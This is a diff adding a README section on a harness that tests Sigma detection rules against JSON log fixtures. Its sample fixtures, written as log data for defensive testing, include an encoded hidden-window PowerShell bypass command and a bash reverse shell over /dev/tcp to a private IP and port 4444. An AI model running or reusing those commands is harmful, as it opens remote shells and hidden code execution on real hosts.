@@ -174,6 +174,85 @@ sigmac -t elastic --format json rules/execution/unix-shell-execution.yml
 
 ---
 
+## Detection-as-Code Test Harness
+
+Validates Sigma rules against **real log samples**, not just YAML syntax. Each fixture tests whether a rule correctly fires (TP) or stays silent (TN) for a given log event.
+
+### Fixture Format
+
+Each fixture is a JSON file with:
+
+```json
+{
+  "rule_id": "4d5e6f7a-8b9c-0d1e-2f3a-4b5c6d7e8f9a",
+  "expected": true,
+  "title": "TP - Encoded PowerShell with bypass",
+  "description": "Suspicious PowerShell with -enc, execution policy bypass, hidden window",
+  "log": {
+    "CommandLine": "powershell.exe -nop -w hidden -ep bypass -enc SQBFAFgA...",
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+  }
+}
+```
+
+| Field | Description |
+|-------|-------------|
+| `rule_id` | UUID of the Sigma rule to test (must match exactly) |
+| `expected` | `true` = must fire, `false` = must stay silent |
+| `title` | Short human-readable test name |
+| `log` | Log event fields — matched against rule's `detection` block |
+
+### Adding New Fixtures
+
+```bash
+# 1. Create fixture in the right platform directory
+touch tests/fixtures/<platform>/<tp|tn>-<rule-description>.json
+
+# 2. Edit fixture with rule UUID, expected outcome, and log fields
+# 3. Run detection test
+python3 -m pytest tests/test_detection.py -v
+
+# 4. Verify result matches expected
+```
+
+**Naming convention:** `{tp|tn}-{rule-short-name}.json`
+- `tp-` rules that SHOULD trigger on this log
+- `tn-` rules that should NOT trigger
+
+### The Matcher Engine
+
+`tests/test_harness/matcher.py` evaluates Sigma detection logic directly:
+
+- **Modifiers:** `|contains`, `|endswith`, `|startswith`, `|regex`
+- **Lists:** `|any` (OR), `|all` (AND) for multi-pattern fields
+- **Conditions:** `1 of selection_*`, `all of selection_*`, `selection_a and selection_b`
+- **Nested fields:** Dotted-path lookup (`requestParameters.bucketName`)
+
+The matcher is **dependency-free** (pure Python stdlib) — no sigmatools or sigma-cli required to run detection tests.
+
+### Example: Adding a Linux TP fixture
+
+```bash
+# 1. Create fixture file
+cat > tests/fixtures/linux/tp-bash-revshell.json << 'EOF'
+{
+  "rule_id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
+  "expected": true,
+  "title": "TP - Reverse shell via /dev/tcp",
+  "log": {
+    "CommandLine": "bash -c 'exec 5<>/dev/tcp/192.168.1.100/4444; cat <&5'",
+    "Image": "/usr/bin/bash"
+  }
+}
+EOF
+
+# 2. Run detection test
+python3 -m pytest tests/test_detection.py::test_rule_against_fixture \
+  -k "tp-bash-revshell" -v
+```
+
+---
+
 ## Design Decisions & Methodology
 
 ### Detection Engineering Principles Applied
